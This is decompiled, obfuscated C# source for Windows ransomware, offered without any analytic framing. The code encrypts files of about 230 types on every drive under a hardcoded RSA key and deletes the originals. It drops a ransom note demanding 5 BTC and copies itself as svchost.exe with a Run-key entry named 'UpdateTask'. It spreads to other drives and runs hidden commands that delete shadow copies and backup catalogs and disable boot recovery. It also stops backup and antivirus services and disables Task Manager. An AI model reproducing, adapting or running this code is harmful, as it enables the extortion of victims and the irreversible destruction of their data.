using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ConsoleApplication7;
using Microsoft.Win32;

internal class a
{
	public static class a
	{
		public const int a = 797;

		public static IntPtr b = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr A_0);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr A_0, IntPtr A_1);
	}

	[CompilerGenerated]
	private sealed class b
	{
		public string a;
	}

	[CompilerGenerated]
	private sealed class c
	{
		private sealed class a
		{
			public c a;

			public b b;

			public string c;

			public bool d(string A_0)
			{
				return A_0 == c.ToLower();
			}
		}

		public b a;

		public string[] b;

		public bool c;

		public string[] d;

		public void f(int A_0)
		{
			try
			{
				b b2 = this.a;
				string c = Path.GetExtension(b[A_0]);
				string fileName = Path.GetFileName(b[A_0]);
				if (!Array.Exists(ad, (string A_0) => A_0 == c.ToLower()) || !(fileName != global::a.m_q))
				{
					return;
				}
				FileInfo fileInfo = new FileInfo(b[A_0]);
				try
				{
					fileInfo.Attributes = FileAttributes.Normal;
				}
				catch
				{
				}
				string text = a(40);
				if (fileInfo.Length < 2368709120u)
				{
					if (global::a.f(b[A_0]))
					{
						string a_ = a(text, m());
						a(b[A_0], text, a_);
					}
				}
				else
				{
					a(b[A_0], text, fileInfo.Length);
				}
				if (this.c)
				{
					this.c = false;
					string path = this.a.a + "/" + global::a.m_q;
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
					if (!File.Exists(path) && this.a.a != folderPath)
					{
						File.WriteAllLines(path, ac);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public void e(int A_0)
		{
			try
			{
				new DirectoryInfo(d[A_0]).Attributes &= ~FileAttributes.Normal;
			}
			catch
			{
			}
			g(d[A_0]);
		}
	}

	[CompilerGenerated]
	private sealed class d
	{
		public string a;

		public bool b(string A_0)
		{
			return A_0 == a;
		}
	}

	private static readonly byte[] m_a = new byte[32];

	private static string m_b = Environment.UserName;

	private static string m_c = "C:\\Users\\";

	public static string d = "v45hchdrg72ns7m6jmy";

	public static bool e = true;

	public static string f = "";

	private static bool m_g = true;

	private static string m_h = "surprise.exe";

	private static bool m_i = true;

	private static string m_j = "svchost.exe";

	public static string k = "oAnWieozQPsRK7Bj83r4";

	private static bool m_l = true;

	private static bool m_m = false;

	private static int m_n = 10;

	private static string m_o = "#base64Image";

	public static string p = "1qrx0frdqdur0lllc6ezm";

	private static string m_q = "READ IT.txt";

	private static bool m_r = true;

	private static bool s = true;

	private static bool t = true;

	private static bool u = true;

	private static bool v = true;

	private static bool w = true;

	public static string x = "19DpJAWr6NCVT2";

	public static string y = x + global::a.k;

	public static string z = "bc";

	public static string aa = z + global::a.p + global::a.d;

	public static readonly Regex ab = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> ac = new List<string>
	{
		"YOU HAVE BEEN HACKED !!!!", "", "But this can be resolved quite easily.", "", "PAY 5 BTC to the following address to have your data", "and systems restored. NON NEGOTIABLE!!!", "BTC ADDRESS FOR PAYMENT: bc1qrsx9vupn68gpeqw033ckwjckqlfwsvfzz8f2lf", "", "", "NOTE THE FOLLOWING for successful data and systems ret:",
		"1. If ransome is not paid"
	};

	private static string[] ad = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
	};

	private static Random ae = new Random();

	[CompilerGenerated]
	private static ThreadStart af;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint A_0, uint A_1, string A_2, uint A_3);

	private static void a(string[] A_0)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (q())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (o())
		{
			new Thread((ThreadStart)delegate
			{
				r();
			}).Start();
		}
		if (h())
		{
			return;
		}
		if (n())
		{
			Environment.Exit(1);
		}
		if (global::a.m_m)
		{
			p();
		}
		if (global::a.m_r)
		{
			d(global::a.m_j);
		}
		else if (global::a.m_i)
		{
			e(global::a.m_j);
		}
		if (global::a.m_l)
		{
			g();
		}
		if (global::a.m_r)
		{
			if (s)
			{
				f();
			}
			if (t)
			{
				e();
			}
			if (u)
			{
				d();
			}
			if (v)
			{
				c();
			}
			if (w)
			{
				b();
			}
		}
		k();
		if (global::a.m_g)
		{
			c(global::a.m_h);
		}
		i();
		a(global::a.m_o);
	}

	public static void r()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool q()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void p()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(global::a.m_n * 1000);
		}
	}

	private static bool o()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + global::a.k);
			object value = registryKey.GetValue(global::a.k);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool n()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string c(int A_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < A_0; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[ae.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string b(int A_0)
	{
		if (global::a.f == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < A_0; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[ae.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return global::a.f;
	}

	public static string h(string A_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(A_0);
		return Convert.ToBase64String(bytes);
	}

	private static void g(string A_0)
	{
		try
		{
			string[] b2 = Directory.GetFiles(A_0);
			bool c = true;
			Parallel.For(0, b2.Length, delegate(int A_0)
			{
				try
				{
					string c2 = Path.GetExtension(b2[A_0]);
					string fileName = Path.GetFileName(b2[A_0]);
					if (Array.Exists(ad, (string A_0) => A_0 == c2.ToLower()) && fileName != global::a.m_q)
					{
						FileInfo fileInfo = new FileInfo(b2[A_0]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = a(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (f(b2[A_0]))
							{
								string a_ = a(text, m());
								a(b2[A_0], text, a_);
							}
						}
						else
						{
							a(b2[A_0], text, fileInfo.Length);
						}
						if (c)
						{
							c = false;
							string path = A_0 + "/" + global::a.m_q;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && A_0 != folderPath)
							{
								File.WriteAllLines(path, ac);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] d = Directory.GetDirectories(A_0);
			Parallel.For(0, d.Length, delegate(int A_0)
			{
				try
				{
					new DirectoryInfo(d[A_0]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				g(d[A_0]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool f(string A_0)
	{
		A_0 = A_0.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (A_0.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string m()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>07lSXOHLTTP9v6jFNxtncTgFHJyGZQVGP+Viwe9PELiOCGcfLIfQNLrpR7vv5xQE3FGpXACGeNz+Ku0vh171SnZ4nAgaZJMF80B/mYLO83V99SFw3GJ1VLRsVQdRlLs9AROIYYIcUm/pJ9J1eWQ8S6Ecec1llUs1xzLyzhTQ9M5B7b9K0ZLTyLQ6znih5czb1z+emN7MkSXE8il4yWcDHKQsLWmFlUkoPSOI/HQ/UE8pFooejJroBDEvjf9Krz4BccJ82xC36SCqd33eocepX9AZRa1a64+SwtswY6z4rwX0m5rrDqHyIdNZ+cRNM/rE73jYiNNjXo3YVoZqWXMpfQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string a(int A_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < A_0--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void a(string A_0, string A_1, string A_2)
	{
		string path = A_0 + "." + b(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(A_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(A_0, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(A_2);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(A_0, "?");
		File.Delete(A_0);
	}

	private static void a(string A_0, string A_1, long A_2)
	{
		l();
		using FileStream fileStream = new FileStream(A_0 + "." + b(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(A_2);
		File.WriteAllText(A_0, "?");
		File.Delete(A_0);
	}

	public static byte[] l()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string a(string A_0, string A_1)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(A_0);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(A_1.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void k()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string a2 = directoryInfo.Name;
					if (!Array.Exists(array, (string A_0) => A_0 == a2))
					{
						g(directories[j]);
					}
				}
			}
			else
			{
				g(driveInfo.ToString());
			}
		}
	}

	private static void e(string A_0)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + A_0;
		if (!(friendlyName != A_0) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void d(string A_0)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + A_0;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != A_0) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					d(A_0);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				d(A_0);
			}
		}
	}

	private static void j()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string processName = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + processName + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void i()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_q;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, ac);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool h()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_j;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_q;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void g()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void c(string A_0)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + A_0))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + A_0);
				}
				catch
				{
				}
			}
		}
	}

	private static void b(string A_0)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + A_0;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void f()
	{
		b("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void e()
	{
		b("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void d()
	{
		b("wbadmin delete catalog -quiet");
	}

	public static void c()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void b()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void a(string A_0)
	{
		if (A_0 != "")
		{
			try
			{
				string text = Path.GetTempPath() + c(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(A_0));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void a()
	{
		r();
	}
}
